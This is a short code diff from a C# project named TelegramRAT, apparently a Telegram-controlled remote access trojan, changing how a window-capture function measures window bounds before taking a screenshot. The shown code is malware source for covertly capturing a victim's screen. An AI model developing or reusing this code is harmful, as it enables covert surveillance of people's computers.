@@ -12,7 +12,8 @@ namespace TelegramRAT
     {
         public static void CaptureWindow(IntPtr hWnd, Stream buffer)
         {
-            Rectangle windowbounds = WinAPI.GetWindowBounds(hWnd);
+            Rectangle windowbounds;
+            WinAPI.GetClientRect(hWnd, out windowbounds);
 
             Bitmap windowCap = new Bitmap(windowbounds.Width - 16, windowbounds.Height - 8);
 
